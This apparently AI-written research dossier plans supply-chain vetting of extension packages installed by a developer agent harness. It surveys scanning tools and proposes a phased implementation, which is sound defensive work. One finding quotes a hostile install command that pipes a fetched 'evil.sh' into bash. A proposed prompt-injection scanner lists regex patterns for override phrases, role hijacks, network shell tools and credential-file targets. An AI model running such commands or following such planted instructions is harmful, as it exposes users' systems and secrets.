# Research Dossier — Supply-chain vetting for pij's package manifest

**Generated**: 2026-05-15
**Research Query**: "Extend the harness to support security scanning of newly installed packages so we're not exposing risk as we install these things."
**Mode**: Pre-plan
**Sources**: Local code reads + perplexity tool-landscape sweep (May 2026). Tool claims about offline mode / free tiers ⚠ verify before depending on them.

---

## TL;DR

Three workable approaches, ordered cheapest → strongest:

1. **Tier 1 (1 day)** — Wire `npm audit` + lockfile-lint + a small GitHub-trust check into `npm run pkg add` and a new `npm run pkg vet [<src>]` subcommand. Free, offline-friendly, catches the obvious.
2. **Tier 2 (2–3 days)** — Add Socket.dev CLI (free tier) + OpenSSF Scorecard API lookups. Catches behavioural-malware patterns and weak-maintenance signals. Needs internet + Socket account.
3. **Tier 3 (workshop-worthy)** — Custom regex scanner for **prompt-injection in extension markdown/tool descriptions**. No off-the-shelf tool exists in May 2026. This is the genuinely-novel piece.

Recommended path: ship Tier 1 first (close the worst legs of the threat model in a day), Tier 2 next, Tier 3 as a separate workshop because the heuristics need design.

---

## Threat model (recap, condensed)

| Vector | Plausibility | Damage | Existing pij defence |
|---|---|---|---|
| Lifecycle scripts run on install (preinstall/postinstall) | High — vector for Shai-Hulud worm | Full system access | None — pi uses `npm install` under the hood without `--ignore-scripts` |
| Malicious runtime code in extension entry | High — npm package can do anything at session load | Full system access | None |
| Prompt injection via SKILL.md / AGENTS.md / tool description | Medium — speculative but no incumbent defence | LLM exfil / role confusion | None |
| Transitive dep CVE | High — every install pulls hundreds of pkgs | Variable | None at pij layer |
| Author / publish-pipeline compromise | Medium — most pi extensions are sole-maintainer | High | None |
| Secret in committable config | **Was high; closed today** | Public key exposure | gitignore + env-var refactor + history audit (2026-05-15) |

---

## State of pij today

Codebase already has the right shape to bolt vetting onto.

| Component | Where | Vetting integration point |
|---|---|---|
| Manifest | `.pi/packages.yaml` | Add per-entry `vetted: { date, by, score, lockHash? }` block |
| Install orchestrator | `harness/scripts/packages.ts` (229 LOC, 6 subcommands) | New `vet` + `audit` subcommands; `bootstrap` gains a pre-flight |
| Self-check | `npm run self-check` (`typecheck → lint → test → smoke`) | Insert `npm run pkg audit` step |
| Per-entry deps | `requires: { bin, install }` already supported | Pattern transfers cleanly to `vet: { ... }` |
| Driver SDK + validator agent | `harness/driver/`, `agents/extension-validator/` | Could host a "post-install behavioural smoke" mode |
| Domain registry | None | N/A — no domains formalised |
| Agent harness | `docs/project-rules/harness.md` (L2) | Add a `npm run pkg vet` invocation as a Boot/Interact/Observe step |

Substrate is healthy. No engineering-harness gap blocking this work.

---

## Tool landscape (May 2026)

Distilled from perplexity research; ⚠ unverified for current accuracy. Maintenance status from same source.

| Tool | Best for | Cost | Offline | Maint. | Pij verdict |
|---|---|---|---|---|---|
| **`npm audit`** | Baseline CVE check on `.pi/npm/`'s transitive tree | free | ✓ (cached DB) | active | **Tier 1 — wire in** |
| **`lockfile-lint`** | Lock-file integrity (registry hosts, HTTPS, checksums) | free | ✓ | active | **Tier 1 — wire in** |
| **OpenSSF Scorecard** (`api.scorecard.dev`) | Maintainer trust score 0–10 across 14 axes | free, API | partial (cached) | active | **Tier 1 — fetch on `pkg add`** |
| **deps.dev API** (`deps.dev/api/v3`) | Programmatic dep graph + advisories | free | ✗ | active | Tier 2 — replaces local `npm ls` walk |
| **Socket.dev CLI** (`@socketsecurity/cli`) | Behavioural malware detection (network calls, fs on ~/.ssh, obfuscation). Strongest tool in space | free tier OK for OSS / ~$15-30/dev/mo paid | ✗ | active | **Tier 2 — wire `package score <name>` JSON into `vet`** |
| **Snyk CLI** | Proprietary CVE DB, often earlier than NVD | free with account | ✗ | active | Tier 2 — alternative or supplement to npm audit |
| **Semgrep CE** + custom rules | Static AST analysis for `child_process`, `eval`, sus fs ops | free | ✓ | active | Tier 2 — small custom ruleset for extension entry files |
| **`npq`** | Pre-install interactive vetting (author age, dormant detection) | free | ✓ | **declining** since mid-2024 | Skip — Socket covers same ground better |
| **Anything for prompt-injection in markdown** | — | — | — | **does not exist** | Tier 3 — pij builds its own |
| **pnpm `strictDepBuilds: true`** | Blocks lifecycle scripts by default | free | ✓ | active | N/A — pij uses npm, but worth flagging as the policy bar |

Headline gap: **no off-the-shelf scanner for prompt-injection in SKILL.md / tool descriptions.** Confirmed by both the perplexity pass and the OWASP cheat sheet (which lists *prevention patterns*, not scanners). Pij would be carving new ground here.

---

## Proposed harness extension — shape

Concrete additions to `harness/scripts/packages.ts`:

### Schema (extend `Entry`)

```ts
interface Entry {
  source: string;
  enabled: boolean;
  note?: string;
  requires?: { bin: string; install: string };
  // NEW
  vetted?: {
    date: string;        // ISO; if older than VET_MAX_AGE (default 30d), warn
    score: number;       // 0–100 composite
    overrides?: string;  // human reason, when score is below threshold
  };
}
```

### Subcommands

| Subcmd | Purpose |
|---|---|
| `pkg vet <source>` | Run all vetters against one source; print a report; on user accept, write `vetted: {...}` into the yaml entry |
| `pkg audit` | Run cheap vetters (npm audit, lockfile-lint, scorecard fetch) across **all enabled entries**; exit non-zero if any fail. Suitable for `self-check` |
| `pkg bootstrap` (modified) | Refuse to install entries without a recent `vetted:` block unless `--unsafe` is passed |

### Vetter modules (one file each under `harness/scripts/vetters/`)

```
vetters/
  npm-audit.ts        — wraps `npm audit --json` over .pi/npm/
  lockfile-lint.ts    — wraps `npx lockfile-lint` if a lock exists
  scorecard.ts        — fetch api.scorecard.dev/projects/{platform}/{name}
  socket.ts           — optional; calls @socketsecurity/cli if installed
  semgrep.ts          — optional; runs semgrep with rules/extension-malicious.yml
  github-trust.ts     — gh api repos/<owner>/<repo>: age, stars, last commit
  prompt-inject.ts    — NEW; regex over SKILL.md / AGENTS.md / tool descriptions
```

Each vetter exports a uniform shape:

```ts
export interface Verdict {
  vetter: string;
  score: number;              // 0–100
  level: "ok" | "warn" | "fail";
  findings: { msg: string; severity: "low" | "med" | "high" }[];
}
```

Aggregate: `score = weighted-avg(vetters)`; `level = max(levels)`; reject if any `fail`.

### Prompt-injection scanner (Tier 3, novel)

Inputs: every `SKILL.md`, `AGENTS.md`, `CLAUDE.md`, prompt template, and the JSON tool-description string from each registered tool inside the installed package.

Heuristic rules (regex / simple parse — cheap, will produce false positives):

| Rule | Pattern |
|---|---|
| Override attempt | `\b(ignore|disregard|forget) (the |all |previous |prior |above) `(instructions|directives|rules) |
| Role hijack | `\bYou are (now |actually )?[A-Z][a-z]+|\bPretend to be|\bAct as (?!a (helpful|software))` |
| Tool/command smuggling in description | `\b(curl|wget|nc|bash -c|powershell|invoke-)`|`https?://[^/\s]+/(?!\w*\.(md|png|jpg))` outside markdown links |
| Exfil targets | `\b(\.ssh|\.aws|credentials|\.env|id_rsa|\.netrc)\b` |
| Base64 / hex smuggling | runs of `[A-Za-z0-9+/]{80,}` or `\\x[0-9a-f]{2}` inside instruction text |
| Authority-appeal pattern | `\bAs (a |the )(security|system|admin|sudo)|requested by the user's (boss|admin)` |

Output: per-file report with line numbers. `level: warn` on any single hit; `level: fail` on ≥3 hits or any Tier-1 hit (exfil targets, tool smuggling).

This is custom code (~200 LOC) but the rule list above is the design.

---

## Phased plan (proposed; user to refine via `/plan-1b`)

| Phase | Scope | Effort | Value |
|---|---|---|---|
| **P0 — schema + cmd skeleton** | Add `vetted` field to Entry, stub `pkg vet`/`audit` commands, no real vetters wired | CS-1 | Unlocks the rest |
| **P1 — Tier-1 vetters** | npm-audit, lockfile-lint, scorecard, github-trust modules. Wire into `pkg add` (offer vet on add) and `pkg audit` | CS-2 | Catches lifecycle-script + sole-maintainer + CVE + dead-author cases |
| **P2 — bootstrap gate** | `pkg bootstrap` refuses unvetted/stale entries unless `--unsafe`. Update RUNBOOK "new-machine recipe" | CS-1 | Reproducibility now means "vetted reproducibility" |
| **P3 — Tier-2 vetters** | Socket.dev (optional, env-gated on `SOCKET_API_KEY`), Snyk, Semgrep with extension-malicious ruleset | CS-3 | Behavioural detection; zero-day capable |
| **P4 — prompt-injection scanner** | Custom regex scanner over SKILL.md / AGENTS.md / tool descriptions in the installed package tree | CS-3 (workshop first) | The novel piece; pij carves new ground |
| **P5 — CI / self-check integration** | `npm run pkg audit` becomes part of `npm run self-check`; nightly cron for stale-vetted alerts | CS-1 | Continuous, not point-in-time |

Phases P0–P2 are the high-leverage minimum. P4 should ideally have a workshop session before implementation (rule-tuning will determine false-positive rate, which determines whether the gate becomes useful or annoying).

---

## Critical discoveries

### 🚨 CD-01: Pij installs are currently un-vetted

**Impact**: Critical
**Source**: Today's security sweep + `pi install` invocations earlier in this session.
**What**: Every entry in `.pi/packages.yaml` was added by `npm run pkg add` with **zero pre-install vetting**. The four currently-enabled packages each clone + npm-install + load with full user privileges. We have no defence beyond manual review.
**Required action**: P0+P1 before any new package is added. Existing entries get retro-vetted via `pkg audit`.

### 🚨 CD-02: Transitive pi-extensions install silently

**Impact**: High
**Source**: `pi-subagents` found installed in `.pi/npm/` despite not being in `packages.yaml`.
**What**: One of our enabled packages pulled `pi-subagents` as a transitive pi-extension. Pi's loader reads `package.json#pi` from every installed package, so a transitive npm dep can register tools + skills + prompts. Our `pkg vet` needs to scan **the full installed tree**, not just the named entry.
**Required action**: vetters operate on the resolved tree, not the manifest line.

### 🚨 CD-03: No prompt-injection scanner exists in May 2026

**Impact**: Medium-High
**Source**: Perplexity research (cited OWASP, ToolHijacker NDSS 2026 paper) confirms none exist.
**What**: Pij would be building the first public version. Heuristics will produce false positives; a workshop should refine the rule list before shipping.
**Required action**: Workshop before P4 implementation. Tier-1 hits (exfil targets) should be high-precision; speculative rules (authority-appeal) need a soft-warn mode.

### 🚨 CD-04: `requires.install` field is itself a vector

**Impact**: Medium
**Source**: `harness/scripts/packages.ts:40` does `execSync(install, { stdio: "inherit" })` with a string from yaml.
**What**: A malicious PR to `packages.yaml` could set `install: 'curl evil.sh | bash'` and a `bootstrap` run executes it. Currently *trusted-by-design* because yaml is committed and PR-reviewed, but the dossier should flag this explicitly and consider an allowlist (e.g. only allow commands matching `^(brew|npm|cargo|pip|uv|apt|mise)\s`).
**Required action**: Document the trust assumption in AGENTS.md; consider command-prefix allowlist as a P1 stretch.

---

## Domain note

No domain registry under `docs/domains/`. The vetting work would be a natural "supply-chain-vetting" domain if pij ever formalises domains, but for now it lives inside the harness layer alongside `link-global.ts` and `packages.ts`.

---

## Open questions for clarify (`/plan-1b`)

1. **Free vs paid Socket.dev?** Free tier limits per-account scans; if pij ever ran in CI we'd hit the wall. Default: free, opt-in to paid via env.
2. **Block or warn?** When `pkg bootstrap` finds an unvetted entry, refuse outright or run with a banner? Default: refuse, override with `--unsafe`.
3. **Vet TTL?** How stale before re-vet? 30d? 90d? Default: 30d.
4. **Prompt-injection scanner phase**: ship cheap regex first (P4) and iterate, or workshop the rule list first?
5. **CI vs local-only?** Pij's `self-check` currently includes smoke (which needs tmux + pi). Should `pkg audit` be a separate command for CI (no network/external tools required) and `pkg vet` for local (the full kitchen sink)?
6. **What about pi's own auto-install at boot?** Pi reads `.pi/settings.json#packages[]` and auto-installs missing entries on session start — completely bypassing our `pkg bootstrap`. Either we hook in earlier (extension that intercepts before tools register) or document the constraint. The first is a workshop topic.

---

## External research opportunities

Already executed in this dossier — perplexity sweep covered the tool landscape thoroughly. No further external research needed for plan-1b. Two open follow-ups for the workshop on P4:

1. **`/deepresearch`** on existing prompt-injection-via-tool-description CVEs and published heuristics (recent USENIX / NDSS papers had relevant work).
2. **`/deepresearch`** on whether the MCP spec has any signing / capability declaration that could provide a positive trust signal (instead of negative detection).

---

## Recommendations

1. **Treat this dossier as Pre-plan**. Run `/plan-1b` to specify, then `/plan-3` to plan, then `/plan-6` to implement P0+P1.
2. **Workshop P4** before implementing — the rule list is the design.
3. **Tier-1 ships fast**: P0+P1+P2 is one-to-two-day's effort and closes most of CD-01.
4. **Build the dossier-led plan, don't lift Socket-wholesale**: even a stub `pkg audit` that runs `npm audit` + lockfile-lint + scorecard is a quantum leap over the current zero.

---

## File inventory (touched on read)

| File | Purpose | LOC |
|---|---|---|
| `harness/scripts/packages.ts` | manifest CLI; needs new subcommands | 229 |
| `.pi/packages.yaml` | manifest data; schema extension target | (4 entries) |
| `.pi/settings.json` | generated; consumed by pi | (4 entries) |
| `.gitignore` | extended today with `.mcp.json`, `.pi/{git,npm,agent}/`, `scratch/` etc | 100+ |
| `AGENTS.md` | "Clarification protocol" added today; add "Security protocol" in P1 | 100+ |
| `RUNBOOK.md` | "Third-party extensions" + "New-machine recipe"; P2 will add a vet line | ~140 |
| `docs/project-rules/harness.md` | BIO contract; P5 adds `pkg audit` step | 92 |

---

## Next steps

**Recommended**: `/plan-1b-specify --simple "supply-chain vetting for pij's package manifest"` (or remove `--simple` if you want multi-phase). The dossier already maps the threat model + tool landscape + extension points; spec stage should fix:

- block-vs-warn policy
- vet TTL
- which tier of vetters is in MVP scope
- whether P4 needs a workshop pass

Then `/plan-3-architect` and `/plan-6-implement`.

**Alternative**: skip to `/plan-2c-workshop` for the prompt-injection-rules design, since that's the hardest unknown.

---

**Research complete.** Waiting for direction on which planning verb comes next.
